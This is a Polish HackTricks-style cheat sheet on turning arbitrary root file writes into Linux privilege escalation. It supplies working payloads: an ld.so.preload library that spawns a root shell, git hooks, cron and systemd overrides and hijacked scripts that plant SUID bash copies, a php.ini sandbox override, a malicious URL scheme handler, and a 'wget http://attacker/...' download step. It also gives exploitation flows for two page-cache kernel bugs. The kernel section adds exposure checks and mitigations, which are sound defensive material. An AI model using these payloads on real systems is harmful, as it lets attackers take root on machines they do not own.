# Dowolny zapis pliku z uprawnieniami root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ten plik działa podobnie jak zmienna środowiskowa **`LD_PRELOAD`**, ale działa również w **binariach SUID**.\
Jeśli możesz go utworzyć lub zmodyfikować, wystarczy dodać **ścieżkę do biblioteki, która zostanie załadowana** przy każdym uruchomieniu binarnego pliku.

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to **skrypty**, które są **uruchamiane** podczas różnych **zdarzeń** w repozytorium git, takich jak utworzenie commita czy merge... Jeśli więc **uprzywilejowany skrypt lub użytkownik** często wykonuje te działania i możliwy jest **zapis do folderu `.git`**, można to wykorzystać do **privesc**.

Na przykład można **wygenerować skrypt** w repozytorium git w **`.git/hooks`**, aby był zawsze wykonywany podczas tworzenia nowego commita:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron i pliki czasu

Jeśli możesz **zapisywać pliki związane z cronem, które wykonuje root**, zwykle możesz uzyskać wykonanie kodu przy następnym uruchomieniu zadania. Interesujące cele obejmują:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Własny crontab użytkownika root w `/var/spool/cron/` lub `/var/spool/cron/crontabs/`
- Timery `systemd` i usługi, które uruchamiają

Szybkie sprawdzenia:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typowe ścieżki nadużyć:

- **Dodaj nowe zadanie cron z uprawnieniami root** do `/etc/crontab` lub pliku w `/etc/cron.d/`
- **Zastąp skrypt** już wykonywany przez `run-parts`
- **Utwórz backdoor w istniejącym celu timera**, modyfikując skrypt lub plik binarny, który uruchamia

Minimalny przykład cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Jeśli możesz zapisywać wyłącznie w katalogu cron używanym przez `run-parts`, umieść tam zamiast tego plik wykonywalny:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Uwagi:

- `run-parts` zwykle ignoruje nazwy plików zawierające kropki, dlatego preferuj nazwy takie jak `backup` zamiast `backup.sh`.
- Niektóre dystrybucje używają `anacron` lub timerów `systemd` zamiast klasycznego cron, ale idea nadużycia jest taka sama: **zmodyfikuj to, co root wykona później**.

### Pliki Service i Socket

Jeśli możesz zapisywać **pliki jednostek `systemd`** lub pliki, do których się odwołują, możesz uzyskać code execution jako root poprzez przeładowanie i ponowne uruchomienie jednostki albo oczekiwanie na uruchomienie ścieżki aktywacji service/socket.

Interesujące cele obejmują:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Nadpisania drop-in w `/etc/systemd/system/<unit>.d/*.conf`
- Skrypty/binary service, do których odwołują się `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Zapisywalne ścieżki `EnvironmentFile=`, ładowane przez service uruchamiany jako root

Szybkie sprawdzenia:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Typowe ścieżki nadużyć:

- **Nadpisanie `ExecStart=`** w należącej do root jednostce service, którą możesz modyfikować
- **Dodanie drop-in override** ze złośliwym `ExecStart=` i wcześniejsze wyczyszczenie starego wpisu
- **Dodanie backdoora do skryptu/binarki** już wskazanej przez jednostkę
- **Przejęcie usługi aktywowanej przez socket** poprzez modyfikację odpowiadającego pliku `.service`, który uruchamia się, gdy socket otrzyma połączenie

Przykładowy złośliwy override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typowy przepływ aktywacji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Jeśli nie możesz samodzielnie restartować usług, ale możesz edytować jednostkę aktywowaną przez socket, może wystarczyć **poczekać na połączenie klienta**, aby uruchomić usługę z backdoorem jako root.

### Nadpisanie restrykcyjnego `php.ini` używanego przez uprzywilejowany sandbox PHP

Niektóre niestandardowe daemony weryfikują kod PHP dostarczony przez użytkownika, uruchamiając `php` z **restrykcyjnym `php.ini`** (na przykład `disable_functions=exec,system,...`). Jeśli kod uruchamiany w sandboxie nadal ma **dowolny mechanizm zapisu** (taki jak `file_put_contents`) i możesz uzyskać dostęp do **dokładnej ścieżki `php.ini`** używanej przez daemona, możesz **nadpisać tę konfigurację**, aby usunąć ograniczenia, a następnie przesłać drugi payload, który uruchomi się z podwyższonymi uprawnieniami.

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację sandboxa.
2. Drugi payload wykonuje kod po ponownym włączeniu niebezpiecznych funkcji.

Minimalny przykład (zastąp ścieżkę używaną przez daemona):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Jeśli daemon działa jako root (lub przeprowadza walidację z użyciem ścieżek należących do root), drugie wykonanie zapewnia kontekst root. Jest to zasadniczo **eskalacja uprawnień poprzez nadpisanie konfiguracji**, gdy sandboxed runtime nadal może zapisywać pliki.

### binfmt_misc

Plik znajdujący się w `/proc/sys/fs/binfmt_misc` wskazuje, który plik binarny powinien wykonywać dany typ plików. TODO: sprawdzić wymagania niezbędne do wykorzystania tego mechanizmu w celu wykonania rev shell, gdy otwierany jest popularny typ pliku.

### Nadpisywanie schema handlers (takich jak http: lub https:)

Atakujący posiadający uprawnienia do zapisu w katalogach konfiguracyjnych ofiary może łatwo zastępować lub tworzyć pliki zmieniające zachowanie systemu, co prowadzi do niezamierzonego wykonania kodu. Modyfikując plik `$HOME/.config/mimeapps.list` tak, aby wskazywał złośliwy plik jako handler URL dla HTTP i HTTPS (np. ustawiając `x-scheme-handler/http=evil.desktop`), atakujący zapewnia, że **kliknięcie dowolnego linku http lub https uruchomi kod określony w pliku `evil.desktop`**. Na przykład po umieszczeniu poniższego złośliwego kodu w pliku `evil.desktop` w `$HOME/.local/share/applications` każde kliknięcie zewnętrznego URL uruchomi osadzone polecenie:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Więcej informacji znajdziesz w [**tym poście**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), w którym wykorzystano realną podatność.

### Root wykonujący skrypty/pliki binarne zapisywalne przez użytkownika

Jeśli uprzywilejowany workflow uruchamia coś w rodzaju `/bin/sh /home/username/.../script` (lub dowolny plik binarny znajdujący się w katalogu należącym do nieuprzywilejowanego użytkownika), możesz to przejąć:

- **Wykryj wykonanie:** monitoruj procesy za pomocą [pspy](https://github.com/DominicBreuker/pspy), aby przechwycić moment, gdy root uruchamia ścieżki kontrolowane przez użytkownika:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potwierdź możliwość zapisu:** upewnij się, że zarówno docelowy plik, jak i jego katalog są własnością Twojego użytkownika lub że masz do nich uprawnienia zapisu.
- **Przejmij plik docelowy:** utwórz kopię zapasową oryginalnego pliku binarnego/skryptu i umieść payload tworzący powłokę SUID (lub wykonujący dowolną inną akcję jako root), a następnie przywróć uprawnienia:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Trigger the privileged action** (np. naciśnięcie przycisku UI, który uruchamia helper). Gdy root ponownie wykona przejętą ścieżkę, przejmij escalated shell za pomocą `./rootshell -p`.

### Modyfikacja uprzywilejowanych plików binarnych wyłącznie w page cache

Niektóre błędy kernela nie modyfikują pliku **na dysku**. Zamiast tego umożliwiają modyfikację wyłącznie kopii pliku w **page cache**, jeśli plik jest readable. Jeśli można obrać za cel binarkę **setuid** lub inną binarkę wykonywaną przez **root**, następne wykonanie może uruchomić kontrolowane przez atakującego bajty z pamięci i doprowadzić do eskalacji uprawnień, mimo że hash pliku na dysku pozostał bez zmian.

Warto traktować to jako **runtime-only file write primitive**:

- **Dysk pozostaje czysty**: inode i bajty zapisane na dysku nie zmieniają się
- **Pamięć jest zmodyfikowana**: procesy odczytujące lub wykonujące zawartość zcachedowanej strony otrzymują zmodyfikowaną przez atakującego treść
- **Efekt jest tymczasowy**: zmiana znika po restarcie lub usunięciu strony z cache

Ten primitive znajduje się pomiędzy klasycznym **arbitrary file write** a starszymi błędami typu **page-cache abuse**, takimi jak Dirty COW / Dirty Pipe:

- Dirty COW opierał się na race condition
- Dirty Pipe miał ograniczenia dotyczące pozycji zapisu
- Primitive oparty wyłącznie na page cache może być bardziej niezawodny, jeśli podatna ścieżka zapewnia bezpośrednie zapisy do cached file-backed pages

#### Generic privesc flow

1. Uzyskaj kernel primitive umożliwiający zapis do **file-backed page cache pages**
2. Użyj go przeciwko **readable privileged binary** lub innemu plikowi wykonywanemu przez root
3. Uruchom wykonanie, **zanim** strona zostanie usunięta z cache
4. Uzyskaj code execution jako root, podczas gdy plik na dysku nadal wygląda na niezmodyfikowany

Typowe cele o wysokiej wartości:

- Binarki **setuid-root**
- Helpery uruchamiane przez **root services**
- Binarki często wykonywane z **containers sharing the host kernel/page cache**

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) jest dobrym przykładem tej klasy. Podatna ścieżka znajdowała się w Linux crypto userspace API (`AF_ALG` / `algif_aead`):

- `splice()` może przenosić referencje do page-cache pages z readable file do crypto TX scatterlist
- ścieżka deszyfrowania in-place `algif_aead` ponownie wykorzystywała source i destination buffers
- `authencesn` zapisywał następnie do destination tag region
- gdy ten region nadal wskazywał na spliced file-backed pages, zapis trafiał do **page cache pliku docelowego**

Interesująca technika nie polega więc na samym CVE, lecz na następującym wzorcu:

- **przekaż file-backed cache pages do kernel subsystem**
- spraw, aby subsystem **traktował je jako writable output**
- wywołaj małe, kontrolowane nadpisanie w pamięci

Publiczny PoC używał wielokrotnych **4-byte writes** do spatchowania `/usr/bin/su` w pamięci, a następnie wykonywał tę binarkę.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) pokazuje inną odmianę tego samego wzorca **page-cache-only write-to-root**, tym razem jednak sinkiem jest **IPsec ESP decrypt**, a nie `AF_ALG`.

Najważniejszą techniką jest etap **metadata-laundering**:

- `splice()` umieszcza **read-only file-backed page-cache page** w pakiecie ESP-in-UDP
- pierwotne zabezpieczenie DirtyFrag oznaczało ten skb flagą `SKBFL_SHARED_FRAG`, aby `esp_input()` wykonał **copy before decrypting**
- netfilter `TEE` duplikuje pakiet przez `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone zachowuje **tę samą fizyczną referencję do page-cache**, ale traci `SKBFL_SHARED_FRAG`
- `esp_input()` traktuje więc clone jako bezpieczny i wykonuje **in-place `cbc(aes)` decrypt** na file-backed page

Wniosek dla reviewera jest szerszy niż samo CVE: jeśli mitigation zależy od **skb/page metadata** przy ustalaniu, czy operacja musi najpierw wykonać copy, każda **clone/copy path, która zachowuje backing page, ale usuwa metadata**, może po cichu ponownie otworzyć write primitive.

Typowy flow exploitation:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, aby uzyskać **`CAP_NET_ADMIN` wewnątrz prywatnego network namespace**
2. Podnieś loopback i zainstaluj regułę **netfilter `TEE`** w `mangle/OUTPUT`
3. Zainstaluj **XFRM ESP transport SAs** przez `NETLINK_XFRM`
4. Zakoduj każde docelowe 4-byte word w polu `seq_hi` SA (trick wyboru słowa DirtyFrag)
5. Wyślij spliced ESP-in-UDP packet, aby **TEE clone** dotarł do `esp_input()` i wykonał decrypt **in place**
6. Powtarzaj, aż page-cache copy `/usr/bin/su` lub innego uprzywilejowanego executable będzie zawierać code kontrolowany przez atakującego

Z punktu widzenia operacyjnego wpływ jest taki sam jak w przykładzie `AF_ALG`: plik na dysku pozostaje czysty, ale `execve()` wykorzystuje **zmodyfikowane bajty page-cache** i zapewnia root.

Przydatne kontrole exposure dla tego wariantu:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Krótkoterminowa redukcja powierzchni ataku jest tutaj również zależna od ścieżki: aktualizacja do kernela zawierającego `48f6a5356a33` naprawia ścieżkę clone, natomiast zablokowanie autoload `xt_TEE` usuwa **krok przekazywania flag**, a zablokowanie `esp4` / `esp6` usuwa **sink deszyfrujący**.

#### Ekspozycja i wykrywanie

Jeśli podejrzewasz tę klasę błędu, nie polegaj wyłącznie na sprawdzaniu integralności dysku. Sprawdź również:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` może być ładowany i wyładowywany jako moduł
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs jest wbudowany w kernel
- binaria setuid są dobrymi celami, ponieważ patch dotyczący wyłącznie page cache może wystarczyć, aby przekształcić lokalny foothold w root

#### Ograniczanie attack surface dla ścieżki `algif_aead`

Jeśli podatny interfejs jest udostępniany przez moduł, który można ładować:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Jeśli zostanie skompilowane do kernela, odnotowano przypadki blokowania ścieżki init za pomocą:
```bash
initcall_blacklist=algif_aead_init
```
Tego rodzaju mitigation warto pamiętać również w przypadku innych kernel LPE: jeśli exploitation zależy od konkretnego optional interface, wyłączenie lub zablokowanie tego interface może przerwać exploit path, nawet zanim będzie dostępna pełna aktualizacja kernela.

## Odnośniki

- [HTB Bamboo – przejmowanie skryptu uruchamianego przez root w zapisywalnym przez użytkownika katalogu PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Ujawnienie CVE-2026-31431 przez Openwall oss-security](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Poprawka Linux stable: crypto: algif_aead - powrót do działania out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Biuletyn Copy Fail](https://copy.fail/)
- [Theori / Xint: technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [Repozytorium / README DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: analiza i exploitation wariantu Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Poprawka Linux: net: skb: zachowanie `SKBFL_SHARED_FRAG` w `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Wcześniejsza mitigation Linux: ustawienie `SKBFL_SHARED_FRAG` dla spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
